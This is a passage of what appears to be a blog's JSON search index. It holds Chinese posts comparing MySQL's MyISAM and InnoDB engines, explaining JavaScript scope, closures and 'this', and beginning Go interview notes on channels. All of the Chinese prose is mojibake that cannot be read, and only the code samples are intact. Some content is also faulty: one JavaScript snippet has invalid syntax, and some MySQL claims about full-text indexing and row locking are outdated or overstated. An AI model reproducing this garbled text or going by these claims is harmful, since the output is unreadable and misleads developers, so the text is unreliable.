åˆ—è¿›è¡Œæ’åºåé€’å¢ã€‚\n\nInnoDBï¼šInnoDBä¸­å¿…é¡»åŒ…å«åªæœ‰è¯¥å­—æ®µçš„ç´¢å¼•ã€‚å¼•æ“çš„è‡ªåŠ¨å¢é•¿åˆ—å¿…é¡»æ˜¯ç´¢å¼•ï¼Œå¦‚æœæ˜¯ç»„åˆç´¢å¼•ä¹Ÿå¿…é¡»æ˜¯ç»„åˆç´¢å¼•çš„ç¬¬ä¸€åˆ—ã€‚\n\n\n\n+ è¡¨é”å·®å¼‚\n\nMyISAMï¼š åªæ”¯æŒè¡¨çº§é”ï¼Œç”¨æˆ·åœ¨æ“ä½œmyisamè¡¨æ—¶ï¼Œselectï¼Œupdateï¼Œdeleteï¼Œinsertè¯­å¥éƒ½ä¼šç»™è¡¨è‡ªåŠ¨åŠ é”ï¼Œå¦‚æœåŠ é”ä»¥åçš„è¡¨æ»¡è¶³insertå¹¶å‘çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨è¡¨çš„å°¾éƒ¨æ’å…¥æ–°çš„æ•°æ®ã€‚\n\nInnoDBï¼š æ”¯æŒäº‹åŠ¡å’Œè¡Œçº§é”ï¼Œæ˜¯innodbçš„æœ€å¤§ç‰¹è‰²ã€‚è¡Œé”å¤§å¹…åº¦æé«˜äº†å¤šç”¨æˆ·å¹¶å‘æ“ä½œçš„æ–°èƒ½ã€‚ä½†æ˜¯InnoDBçš„è¡Œé”ï¼Œåªæ˜¯åœ¨WHEREçš„ä¸»é”®æ˜¯æœ‰æ•ˆçš„ï¼Œéä¸»é”®çš„WHEREéƒ½ä¼šé”å…¨è¡¨çš„ã€‚\n\n\n\n+ å…¨æ–‡ç´¢å¼•\n\nMyISAMï¼šæ”¯æŒ FULLTEXTç±»å‹çš„å…¨æ–‡ç´¢å¼•\n\nInnoDBï¼šä¸æ”¯æŒFULLTEXTç±»å‹çš„å…¨æ–‡ç´¢å¼•ï¼Œä½†æ˜¯innodbå¯ä»¥ä½¿ç”¨sphinxæ’ä»¶æ”¯æŒå…¨æ–‡ç´¢å¼•ï¼Œå¹¶ä¸”æ•ˆæœæ›´å¥½ã€‚\n\n\n\n+ è¡¨ä¸»é”®\n\nMyISAMï¼šå…è®¸æ²¡æœ‰ä»»ä½•ç´¢å¼•å’Œä¸»é”®çš„è¡¨å­˜åœ¨ï¼Œç´¢å¼•éƒ½æ˜¯ä¿å­˜è¡Œçš„åœ°å€ã€‚\n\nInnoDBï¼šå¦‚æœæ²¡æœ‰è®¾å®šä¸»é”®æˆ–è€…éç©ºå”¯ä¸€ç´¢å¼•ï¼Œå°±ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª6å­—èŠ‚çš„ä¸»é”®(ç”¨æˆ·ä¸å¯è§)ï¼Œæ•°æ®æ˜¯ä¸»ç´¢å¼•çš„ä¸€éƒ¨åˆ†ï¼Œé™„åŠ ç´¢å¼•ä¿å­˜çš„æ˜¯ä¸»ç´¢å¼•çš„å€¼ã€‚\n\n\n\n+ è¡¨çš„å…·ä½“è¡Œæ•°\n\nMyISAMï¼š ä¿å­˜æœ‰è¡¨çš„æ€»è¡Œæ•°ï¼Œå¦‚æœselect count(*) from table;ä¼šç›´æ¥å–å‡ºå‡ºè¯¥å€¼ã€‚*\n\nInnoDBï¼š æ²¡æœ‰ä¿å­˜è¡¨çš„æ€»è¡Œæ•°ï¼Œå¦‚æœä½¿ç”¨select count(*) from tableï¼›å°±ä¼šéå†æ•´ä¸ªè¡¨ï¼Œæ¶ˆè€—ç›¸å½“å¤§ï¼Œä½†æ˜¯åœ¨åŠ äº†wehreæ¡ä»¶åï¼Œmyisamå’Œinnodbå¤„ç†çš„æ–¹å¼éƒ½ä¸€æ ·ã€‚\n\n\n\n+ CRUDæ“ä½œ\n\nMyISAMï¼šå¦‚æœæ‰§è¡Œå¤§é‡çš„SELECTï¼ŒMyISAMæ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚\n\nInnoDBï¼šå¦‚æœä½ çš„æ•°æ®æ‰§è¡Œå¤§é‡çš„INSERTæˆ–UPDATEï¼Œå‡ºäºæ€§èƒ½æ–¹é¢çš„è€ƒè™‘ï¼Œåº”è¯¥ä½¿ç”¨InnoDBè¡¨ã€‚\n\n\n\n+ å¤–é”®\n\nMyISAMï¼šä¸æ”¯æŒ\n\nInnoDBï¼šæ”¯æŒ\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ [MySQLå­˜å‚¨å¼•æ“ï¼ï¼MyISAMä¸InnoDBåŒºåˆ«](https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000008227211)\n\n","tags":["mysql"],"categories":["mysql"]},{"title":"javascriptä½œç”¨åŸŸ,ä¸Šä¸‹æ–‡ç¯å¢ƒ,è‡ªç”±å˜é‡ä»¥åŠé—­åŒ…","url":"%2Fp%2F1e35a583.html","content":"\n\n\n### javascript çš„ä½œç”¨åŸŸ\n\n+ åœ¨ javascript ä¸­, æ²¡æœ‰å—çº§çš„ä½œç”¨åŸŸ (åäººç±»),  æ‰€ä»¥ä¸ºäº†é¿å…è¯¯è§£, æœ€å¥½ä¸è¦åœ¨å—ä½œç”¨åŸŸå†…å£°æ˜å˜é‡\n\n```javascript\nvar i = 10;\nif i > 1 {\n    var name = \"levon\";\n}\nconsole.log(name);//levon\n```\n\n+ é™¤äº†å…¨å±€ä½œç”¨åŸŸ, åªæœ‰å‡½æ•°æ‰å¯ä»¥åˆ›å»ºä½œç”¨åŸŸ\n+ ä½œç”¨åŸŸæœ‰ä¸Šä¸‹çº§å…³ç³», æœ€å¤§çš„ç›®çš„å°±æ˜¯éš”ç¦»å˜é‡, ä¸åŒä½œç”¨åŸŸä¸‹åŒåå˜é‡ä¹Ÿä¸ä¼šå†²çª\n\n```javascript\nvar a = 10; //window.a = 10; å…¨å±€ä½œç”¨åŸŸ\n\nfunction fn(){\n    var a = 100; //fn ä½œç”¨åŸŸ\n    \n    function bar(){\n        var a = 1000; //bar ä½œç”¨åŸŸ\n    }\n}\n```\n\n<!-- more -->\n\n### javascript çš„ä½œç”¨åŸŸå’Œæ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒ\n\n- ä½œç”¨åŸŸåªæ˜¯ä¸€ä¸ªâ€œåœ°ç›˜â€ï¼Œä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µã€‚\n- å¦‚æœè¦æŸ¥æ‰¾ä¸€ä¸ªä½œç”¨åŸŸä¸‹æŸä¸ªå˜é‡çš„å€¼ï¼Œå°±éœ€è¦æ‰¾åˆ°è¿™ä¸ªä½œç”¨åŸŸå¯¹åº”çš„æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå†åœ¨å…¶ä¸­å¯»æ‰¾å˜é‡çš„å€¼ã€‚\n- ä½œç”¨åŸŸä¸­å˜é‡çš„å€¼æ˜¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„ç¡®å®šçš„ï¼Œè€Œä½œç”¨åŸŸå´æ˜¯åœ¨å‡½æ•°åˆ›å»ºæ—¶å°±ç¡®å®šäº†ã€‚\n- åŒä¸€ä¸ªä½œç”¨åŸŸä¸‹ï¼Œä¸åŒçš„è°ƒç”¨ä¼šäº§ç”Ÿä¸åŒçš„æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œç»§è€Œäº§ç”Ÿä¸åŒçš„å˜é‡çš„å€¼ã€‚\n\n\n\n### ä½œç”¨åŸŸå’Œä¸Šä¸‹æ–‡ç¯å¢ƒç»å¯¹ä¸æ˜¯ä¸€å›äº‹å„¿\n\n+ ä½œç”¨åŸŸ:\n\né¦–å…ˆï¼Œå®ƒå¾ˆæŠ½è±¡ã€‚å¦å¤–é™¤äº†å…¨å±€ä½œç”¨åŸŸï¼Œåªæœ‰å‡½æ•°æ‰èƒ½åˆ›å»ºä½œç”¨åŸŸã€‚åˆ›å»ºä¸€ä¸ªå‡½æ•°å°±åˆ›å»ºäº†ä¸€ä¸ªä½œç”¨åŸŸï¼Œæ— è®ºä½ è°ƒç”¨ä¸è°ƒç”¨ï¼Œå‡½æ•°åªè¦åˆ›å»ºäº†ï¼Œå®ƒå°±æœ‰ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œå°±æœ‰è‡ªå·±çš„ä¸€ä¸ªâ€œåœ°ç›˜â€ã€‚\n\n+ ä¸Šä¸‹æ–‡ç¯å¢ƒ:\n\nå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªçœ‹ä¸è§æ‘¸ä¸ç€çš„å¯¹è±¡ï¼ˆæœ‰è‹¥å¹²ä¸ªå±æ€§ï¼‰ï¼Œè™½ç„¶çœ‹ä¸è§æ‘¸ä¸ç€ï¼Œä½†ç¡®å®å®å®åœ¨åœ¨å­˜åœ¨çš„ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡éƒ½åœ¨é‡Œé¢å­˜å‚¨ç€ï¼Œè¦ä¸ç„¶å’±ä»¬å®šä¹‰çš„å˜é‡åœ¨å“ªé‡Œå­˜ï¼Ÿ\n\nå¦å¤–ï¼Œå¯¹äºå‡½æ•°æ¥è¯´ï¼Œä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯åœ¨è°ƒç”¨æ—¶åˆ›å»ºçš„ï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£ã€‚æ‹¿å‚æ•°åšä¾‹å­ï¼Œä½ ä¸è°ƒç”¨å‡½æ•°ï¼Œæˆ‘å“ªå„¿çŸ¥é“ä½ è¦ç»™æˆ‘ä¼ ä»€ä¹ˆå‚æ•°ï¼Ÿ\n\n+ ä¸¤è€…ä¹‹é—´çš„å…³ç³»:\n\nä¸€ä¸ªä½œç”¨åŸŸä¸‹å¯èƒ½åŒ…å«è‹¥å¹²ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒã€‚æœ‰å¯èƒ½ä»æ¥æ²¡æœ‰è¿‡ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆå‡½æ•°ä»æ¥å°±æ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼‰ï¼›æœ‰å¯èƒ½æœ‰è¿‡ï¼Œç°åœ¨å‡½æ•°è¢«è°ƒç”¨å®Œæ¯•åï¼Œä¸Šä¸‹æ–‡ç¯å¢ƒè¢«é”€æ¯äº†ï¼›æœ‰å¯èƒ½åŒæ—¶å­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªï¼ˆé—­åŒ…ï¼‰ã€‚\n\n```javascript\nvar x = 100;\nfunction fn(x){\n    return function(){\n        console.log(x);\n    }\n}\n\nvar f1 = fn(5);\nvar f2 = fn(10);\n\nf1();//5\nf2();//10\n```\n\nä¸Šé¢ä»£ç ä¸€ä¸ªfnä½œç”¨åŸŸä¸‹åŒæ—¶å­˜åœ¨ä¸¤ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒã€‚å¯ä»¥ç†è§£ä½œç”¨åŸŸæ˜¯é™æ€çš„ç»„ç»‡ç»“æ„ï¼Œè€Œä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯åŠ¨æ€çš„è°ƒç”¨ã€‚\n\n\n\n### è‡ªç”±å˜é‡ä¾èµ–é™æ€ä½œç”¨åŸŸ\n\n- åœ¨ Aä½œç”¨åŸŸä¸­ä½¿ç”¨çš„å˜é‡ x, å´æ²¡æœ‰åœ¨ Aä½œç”¨åŸŸä¸­å£°æ˜(å³åœ¨å…¶ä»–ä½œç”¨åŸŸä¸­å£°æ˜çš„), é‚£ä¹ˆå¯¹äº Aä½œç”¨åŸŸæ¥è¯´, x å°±æ˜¯ä¸€ä¸ªè‡ªç”±å˜é‡.\n\n```javascript\nvar x = 10;\nfunction fn(){\n    var b = 20;\n    console.log(x + b); //è¿™é‡Œçš„ x å°±æ˜¯ä¸€ä¸ªè‡ªç”±å˜é‡\n}\n```\n\n- é‚£ä¹ˆå»å“ªé‡Œå–è‡ªç”±å˜é‡çš„å€¼?  è¦åˆ° åˆ›å»º åŒ…å«è‡ªç”±å˜é‡ å‡½æ•° çš„é‚£ä¸ª ä½œç”¨åŸŸ ä¸­å–å€¼â€”â€”æ˜¯â€œåˆ›å»ºâ€ï¼Œè€Œä¸æ˜¯â€œè°ƒç”¨â€. ä¸€å®šè¦åˆ‡è®°å…¶å®è¿™å°±æ˜¯æ‰€è°“çš„â€œé™æ€ä½œç”¨åŸŸâ€ã€‚\n\n- é‚£ä¹ˆåœ¨æ‰§è¡Œ fn çš„æ—¶å€™, x å–å€¼å»å“ªé‡Œå–å‘¢?  ç­”æ¡ˆæ˜¯è¦åˆ°åˆ›å»ºfnå‡½æ•°çš„é‚£ä¸ªä½œç”¨åŸŸä¸­å–â€”â€”>æ— è®ºfnå‡½æ•°å°†åœ¨å“ªé‡Œè°ƒç”¨ã€‚(anywhere call, only find on create)\n\n- å¦‚æœé™æ€ä½œç”¨åŸŸæ‰¾ä¸åˆ°æ€ä¹ˆåŠ? æ­¤æ—¶å°±éœ€è¦ä¸€çº§ä¸€çº§è·¨ä½œç”¨åŸŸä¸€ç›´æ‰¾åˆ°å…¨å±€ä½œç”¨åŸŸ\n\n```javascript\nvar a = 10;\n\nfunction fn(){\n    var b = 20; // å¦‚æœæ­¤å¤„æ²¡æœ‰20, b å°±ä¼šæ‰¾åˆ°200\n    \n    function bar(){\n        console.log(a + b);// a ä¸€ç›´è·¨åˆ°å…¨å±€ä½œç”¨åŸŸæ‰¾åˆ°, b ç›´æ¥åœ¨ fn ä½œç”¨åŸŸæ‰¾åˆ°,  \n    }\n    \n    return bar;\n}\n\nvar x = fn();\nvar b = 200;\nx();\n```\n\n\n\næ¥çœ‹ä¸€é“é¢˜:\n\n```javascript\nvar x = 10;\n\nfunction show(){\n\n\tfunction fn(){\n\t\tconsole.log(x);\n\t}\n\n    var x = 20;\n\n\t(function(){\n\t\tvar x = 30;\n\t\tfn();\n\t})();\n}\n\nshow();//ç­”æ¡ˆæ˜¯20, æƒ³æƒ³ä¸ºä»€ä¹ˆ\n```\n\n\n\n### é—­åŒ…å…¶å®å°±æ˜¯ä¸Šä¸‹æ–‡ç¯å¢ƒä¸é”€æ¯\n\né—­åŒ…ä¸€èˆ¬åªæœ‰ä¸¤ç§æƒ…å†µâ€”â€”å‡½æ•°ä½œä¸ºè¿”å›å€¼ï¼Œå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ã€‚\n\n```javascript\nfunction fn(){\n    var max = 10;\n    \n    return function bar(x){\n        if (x > max){\n            console.log(x);\n        }\n    };\n}\n\nvar f1 = fn();\nvar max = 100;\nf1(15);\n```\n\n\n\n+ å…¨å±€ä¸Šä¸‹æ–‡ç¯å¢ƒå‡†å¤‡,   global â€”>  f1 = undefined, max = undefined\n+ æ‰§è¡Œåˆ° var f1 = fn();  è¿›å…¥fn()æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒ.    fn â€”> max = 10\n+ fn() å‡½æ•°è¿”å›, æœ¬æ¥è¦é”€æ¯ä¸Šä¸‹æ–‡çš„max,  ä½†æ˜¯ bar å‡½æ•°å´å¼•ç”¨äº†è¿™ä¸ªmax, å› æ­¤è¿™ä¸ªmaxä¸èƒ½è¢«é”€æ¯ï¼Œé”€æ¯äº†barå‡½æ•°ä¸­çš„maxå°±æ‰¾ä¸åˆ°å€¼äº†ã€‚æ‰€ä»¥fn()ä¸Šä¸‹æ–‡ç¯å¢ƒä¿ç•™.  fn â€”> max = 10\n+ var max = 100;    global â€”> f1 = fn(), max = 100\n+ f1(15)  è¿›å…¥fnæ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒ, max æ˜¯10,  x æ˜¯15, è¾“å‡º15\n+ æ‰§è¡Œå®Œæ¯•è¿›å…¥å…¨å±€ä¸Šä¸‹æ–‡ç¯å¢ƒ\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascriptæ‰§è¡Œä¸Šä¸‹æ–‡çš„å‡†å¤‡å·¥ä½œ","url":"%2Fp%2Fcfbcfff.html","content":"\n\n\n### å…¨å±€ä¸Šä¸‹æ–‡çš„å‡†å¤‡å·¥ä½œ:\n\nå…¨å±€ç¯å¢ƒä¸‹ javascriptçœŸæ­£è¿è¡Œè¯­å¥ä¹‹å‰, è§£é‡Šå™¨ä¼šåšä¸€äº›å‡†å¤‡å·¥ä½œ:\n\n- å¯¹å˜é‡çš„å£°æ˜ (è€Œå˜é‡çš„èµ‹å€¼, æ˜¯çœŸæ­£è¿è¡Œåˆ°é‚£ä¸€è¡Œçš„æ—¶å€™æ‰è¿›è¡Œçš„.)\n- å¯¹å…¨å±€å˜é‡ this çš„èµ‹å€¼\n- å¯¹å‡½æ•°å£°æ˜èµ‹å€¼, å¯¹å‡½æ•°è¡¨è¾¾å¼å£°æ˜\n\n\n\nå¦‚ä½•ç†è§£è¿™ä¸‰ç§æƒ…å†µå‘¢?\n\n1. å¯¹å˜é‡çš„å£°æ˜:\n\n```javascript\nconsole.log(a); // undefined\nvar a = 10;\n```\n\nå‡†å¤‡å·¥ä½œæ˜¯æå‰å£°æ˜äº†å˜é‡ a, å’Œä¸‹é¢å†™æ³•æ„æ€ä¸€æ ·\n\n```javascript\nvar a; \nconsole.log(a); // undefined\na = 10;\n```\n\n<!-- more -->\n\n2. å¯¹å…¨å±€å˜é‡ this çš„èµ‹å€¼:\n\n```javascript\nconsole.log(this) // window\n```\n\næ‰§è¡Œå‰çš„å‡†å¤‡å·¥ä½œæ˜¯:  this èµ‹å€¼ä¸ºå…¨å±€çš„ window å¯¹è±¡\n\n\n\n3. å¯¹å‡½æ•°å£°æ˜èµ‹å€¼, å¯¹å‡½æ•°è¡¨è¾¾å¼å£°æ˜:\n\n```javascript\nconsole.log(f1);// function f1() {}\nfunction f1() {} //è¿™ä¸ªæ˜¯å‡½æ•°å£°æ˜\n\nconsole.log(f2);  // undefined\nvar f2 = function(){}; //è¿™ä¸ªæ˜¯å‡½æ•°è¡¨è¾¾å¼\n```\n\næ‰§è¡Œå‰çš„å‡†å¤‡å·¥ä½œæ˜¯:  å‡½æ•°å£°æ˜ f1 è¢«èµ‹å€¼, å‡½æ•°è¡¨è¾¾å¼ f2 è¢«å£°æ˜\n\n\n\n### å‡½æ•°ä¸Šä¸‹æ–‡é¢å¤–çš„å‡†å¤‡å·¥ä½œ:\n\n1. å‡½æ•°å®šä¹‰æ—¶, é¢å¤–çš„å‡†å¤‡å·¥ä½œ:\n\n- è®°å½•å‡½æ•°å†…è‡ªç”±å˜é‡çš„ä½œç”¨åŸŸ.  (è‡ªç”±å˜é‡å°±æ˜¯å¼•ç”¨å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡)\n\n```javascript\nvar a = 10;\nfunction fn (){\n    console.log(a); // aæ˜¯è‡ªç”±å˜é‡,æ­¤å¤„å®šä¹‰æ—¶å°±è®°å½•äº†aè¦å–å€¼çš„ä½œç”¨åŸŸ,å³å…¨å±€ä½œç”¨åŸŸ\n}\n\nfunction bar(f){\n    var a = 20;\n    f(); // è¾“å‡º10, è€Œä¸æ˜¯20, å› ä¸ºfnå‡½æ•°å†…è‡ªç”±å˜é‡ a çš„ä½œç”¨åŸŸæ—©è¢«è®°å½•ä¸‹æ¥äº†,æ˜¯å¤–é¢çš„10\n}\nbar(fn)\n```\n\n\n\n2. å‡½æ•°è°ƒç”¨æ—¶, é¢å¤–çš„å‡†å¤‡å·¥ä½œ:\n\n- arguments å˜é‡çš„èµ‹å€¼\n- å‡½æ•°å‚æ•°çš„èµ‹å€¼\n\n```javascript\nfunction fn(x){\n    console.log(arguments); // [10]\n    console.log(x); // 10\n}\nfn(10);\n```\n\n\n\n### æ¥çœ‹ä¸€é“é¢˜:\n\n```javascript\nvar a = 'global';\nvar f = function(){\n    console.log(a); // ç­”æ¡ˆæ˜¯undefined, æƒ³æƒ³ä¸ºä»€ä¹ˆ\n    var a = 'local';\n}\nf();\n```\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascriptçš„thisç©¶ç«ŸæŒ‡ä»€ä¹ˆ","url":"%2Fp%2Fd14f4ebd.html","content":"\n\n\nåœ¨å­¦ä¹  javascript çš„ thisä¹‹å‰, æˆ‘ä»¬éœ€è¦å…ˆæ˜ç¡®ä¸€ä¸ªé‡è¦çŸ¥è¯†:\n\n> åœ¨å‡½æ•°ä¸­thisåˆ°åº•å–ä½•å€¼ï¼Œæ˜¯åœ¨å‡½æ•°çœŸæ­£è¢«è°ƒç”¨æ‰§è¡Œçš„æ—¶å€™ç¡®å®šçš„ï¼Œå‡½æ•°å®šä¹‰çš„æ—¶å€™ç¡®å®šä¸äº†ã€‚\n>\n> ç®€å•è®°å¿†æ˜¯ï¼Œè°è°ƒç”¨çš„å‡½æ•°ï¼Œthiså°±æŒ‡å‘è°.\n\n\n\nåœ¨ javascript ä¸­, thisçš„å–å€¼ï¼Œä¸€èˆ¬åˆ†ä¸ºä¸‹é¢å‡ ç§æƒ…å†µã€‚\n\n### ä¸€.  æ„é€ å‡½æ•°\n\n+ new å‡ºçš„å¯¹è±¡:\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // å½“å‰æ„é€ çš„å¯¹è±¡\n}\n\nvar f1 = new Foo();\n```\n\n\n\n+ ç›´æ¥è¿è¡Œå‡½æ•°(æ™®é€šå‡½æ•°ä½¿ç”¨):\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // ç›´æ¥è°ƒç”¨æ³¨æ„æ­¤å¤„æ˜¯ window\n}\n\nFoo();// window.Foo();\n```\n\n<!-- more -->\n\n### äºŒ.  å‡½æ•°ä½œä¸ºå¯¹è±¡çš„å±æ€§\n\n+ å¯¹è±¡è°ƒç”¨æœ¬èº«çš„å‡½æ•°:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // æ­¤å¤„å°±æ˜¯ obj\n        console.log(this.x);//10\n    }\n}\n\nobj.fn();\n```\n\n\n\n+ å¦‚æœä¸ç”¨å¯¹è±¡å»è°ƒç”¨:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // window\n        console.log(this.x);// undefined\n    }\n}\n\nvar fn1 = obj.fn;\nfn1();//window.fn1();\n\n```\n\n\n\n+ éœ€è¦æ³¨æ„çš„ä¸€ç§æƒ…å†µæ˜¯ä¸‹é¢çš„ f()å‡½æ•°, æ­¤æ—¶ f()åªæ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°\n\n```javascript\nvar obj = {\n\tx : 10,\n\tfn : function(){\n\t\t\n        this;// æ­¤å¤„æ˜¯ obj\n        \n\t\tfunction f(){\n\t\t\tconsole.log(this); // window\n\t\t\tconsole.log(this.x);// undefined\n\t\t}\n\t\tf();\n        \n\t}\n}\n\nobj.fn();\n```\n\n  \n\n### ä¸‰: å‡½æ•°ç”¨ call æˆ– apply è°ƒç”¨\n\n+ å‡½æ•°è°ƒç”¨ call\n\n```javascript\nvar obj = {\n    x : 10\n};\n\nvar fn = function(){\n    console.log(this);  //å‡½æ•°è°ƒç”¨call, thisæŒ‡å‘callä¸­çš„å‚æ•°, å°±æ˜¯obj\n    console.log(this.x);// 10\n}\n\nfn.call(obj)\n```\n\n\n\n### å››:  å…¨å±€ç¯å¢ƒä¸‹çš„ this\n\n```javascript\nconsole.log(this); // window\n\n\nvar x = 10; //--> window.x = 10\nvar fn = function(){\n    console.log(this); //window\n    console.log(this.x)//10\n}\nfn();// window.fn();\n```\n\n\n\n### äº”: åŸå‹é“¾ä¸­çš„ this\n\n```javascript\nfunction Fn(){\n    this.name = \"levon\";\n}\n\nFn.prototype.getName = function(){\n    console.log(this.name); //æ­¤å¤„ this æ˜¯è°ƒç”¨çš„å½“å‰å¯¹è±¡ f1\n}\n\nvar f1 = new Fn();\nf1.getName(); //levon\n```\n\n\n\nå…¶å®ä¸ä»…ä»…æ˜¯æ„é€ å‡½æ•°çš„prototypeï¼Œå³ä¾¿æ˜¯åœ¨æ•´ä¸ªåŸå‹é“¾ä¸­ï¼Œthisä»£è¡¨çš„ä¹Ÿéƒ½æ˜¯å½“å‰å¯¹è±¡çš„å€¼ã€‚","tags":["javascript"],"categories":["javascript"]},{"title":"golangé¢è¯•åŸºç¡€çŸ¥è¯†ç‚¹","url":"%2Fp%2F19ae52d4.html","content":"\n\n\n# 1. channel\n\n### 1.1 å…³é—­æœ‰ç¼“å†²æ•°æ®çš„ channelï¼Œ è¿˜èƒ½è¯»å–å—ï¼ˆå¯ä»¥ï¼‰\n\nåªæœ‰å½“channelæ— æ•°æ®ï¼Œä¸”channelè¢«closeäº†ï¼Œæ‰ä¼šè¿”å›ok=falseã€‚ åªè¦æœ‰å †ç§¯æ•°æ®ï¼Œå³ä½¿ close() ä¹Ÿä¸ä¼šè¿”å›å…³é—­çŠ¶æ€ã€‚\n\nå…³é—­åæœ‰æ•°æ®ä¹Ÿèƒ½ä»é‡Œé¢å¾—åˆ°æ•°æ®ï¼Œé™¤éæ¶ˆè€—ç©ºäº†ã€‚\n\n<!-- more -->\n\n```go\nfunc main() {\n\n\tc := make(chan int, 10)\n\tc <- 1\n\tc <- 2\n\tc <- 3\n\tclose(c)\n\n\tfor {\n\t\tdata, ok := <-c\n\t\tif !ok {\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(data, ok)\n\t}\n}\n\n/*\n1 true\n2 true\n3 true\n*/\n```\n\n\n\n### 1.2 channel è¢«closeåï¼Œè¿˜èƒ½è¢«æ¥æ”¶æˆ– select å—ï¼ˆå¯ä»¥è¯»ï¼Œä¸èƒ½å†™ï¼‰\n\n+ å¦‚æœæœ‰ç¼“å­˜ï¼Œå€¼èƒ½è¢«æ”¶åˆ°ï¼Œok æ˜¯ true\n\n+ å¦‚æœæ— ç¼“å­˜ï¼Œå€¼æ˜¯0ï¼Œok æ˜¯ falseï¼Œä½†ä¸ä¼š panic\n+ å…³é—­å, å°±æ˜¯ä½ å¯ä»¥è¯», ä½†æ˜¯ä¸èƒ½å†™ã€‚\n\n\n\n### 1.3 å¦‚ä½•åˆ¤æ–­channelå·²ç»å…³é—­äº† ï¼Ÿ\n\n**Go ä¸­æ²¡æœ‰ä¸€ä¸ªå…§å»ºå‡½æ•°å»æ£€æµ‹ç®¡é“æ˜¯å¦å·²ç»è¢«å…³é—­ã€‚**\n\n+ ç›´æ¥è¯»å–channelç»“æ„hchançš„closedå­—æ®µ, ä¸å®‰å…¨\n\n```go\nimport (\n    \"unsafe\"\n    \"reflect\"\n)\n\n\nfunc isChanClosed(ch interface{}) bool {\n    if reflect.TypeOf(ch).Kind() != reflect.Chan {\n        panic(\"only channels!\")\n    }\n\n    // get interface value pointer, from cgo_export \n    // typedef struct { void *t; void *v; } GoInterface;\n    // then get channel real pointer\n    cptr := *(*uintptr)(unsafe.Pointer(\n        unsafe.Pointer(uintptr(unsafe.Pointer(&ch)) + unsafe.Sizeof(uint(0))),\n    ))\n\n    // this function will return true if chan.closed > 0\n    // see hchan on https://github.com/golang/go/blob/master/src/runtime/chan.go \n    // type hchan struct {\n    // qcount   uint           // total data in the queue\n    // dataqsiz uint           // size of the circular queue\n    // buf      unsafe.Pointer // points to an array of dataqsiz elements\n    // elemsize uint16\n    // closed   uint32\n    // **\n\n    cptr += unsafe.Sizeof(uint(0))*2\n    cptr += unsafe.Sizeof(unsafe.Pointer(uintptr(0)))\n    cptr += unsafe.Sizeof(uint16(0))\n    return *(*uint32)(unsafe.Pointer(cptr)) > 0\n}\n```\n\n+ æ­£å¸¸åšæ³•æ˜¯è¦ç›‘å¬ close()çš„ channel,  æ”¶åˆ°é€šçŸ¥\n\n  å¦‚æœæ‚¨ä¸çŸ¥é“é€šé“æ˜¯å¦å…³é—­å¹¶ä¸”ç›²ç›®åœ°å†™å…¥è¯¥é€šé“ï¼Œåˆ™è¯´æ˜æ‚¨çš„ç¨‹åºè®¾è®¡ä¸è‰¯ã€‚ é‡æ–°è®¾è®¡å®ƒï¼Œä½¿å…¶åœ¨å…³é—­åæ— æ³•å†™å…¥ã€‚\n\n+ å¯ç”¨ boolå€¼ï¼Œä½†æ˜¯ä¼šå¤šè¯»ä¸€ä¸ªå€¼\n\n  ```go\n  value, ok := <- channel \n  if !ok {    \n    // channel was closed and drained \n  }\n  ```\n\n\n\n\n### 1.4 channel çš„é›¶å€¼\n\nchannelçš„é›¶å€¼æ˜¯nilã€‚ä¹Ÿè®¸ä¼šè®©ä½ è§‰å¾—æ¯”è¾ƒå¥‡æ€ªï¼Œnilçš„channelæœ‰æ—¶å€™ä¹Ÿæ˜¯æœ‰ä¸€äº›ç”¨å¤„çš„ã€‚\n\n+ å› ä¸ºå¯¹ä¸€ä¸ªnilçš„channelå‘é€å’Œæ¥æ”¶æ“ä½œä¼šæ°¸è¿œé˜»å¡\n+ åœ¨selectè¯­å¥ä¸­æ“ä½œnilçš„channelæ°¸è¿œéƒ½ä¸ä¼šè¢«selectåˆ°ã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨nilæ¥æ¿€æ´»æˆ–è€…ç¦ç”¨caseã€‚\n\n```go\nfunc main() {\n\n\tvar c chan int\n\tfmt.Println(c)\n\n\tfor {\n\t\tselect {\n\t\tcase <-c:\n\t\t\tfmt.Println(\"nerver\")\n\t\tdefault:\n\t\t}\n\t}\n}\n\n\n// è¾“å‡º nil ä¹‹åæ— çº¿å¾ªç¯ï¼Œä¸ä¼šè¾“å‡º nerver\n```\n\n\n\n### 1.5 ä¼˜é›…çš„å…³é—­ channel\n\nhttps://www.liuvv.com/p/8b210700.html\n\n\n\n### 1.6 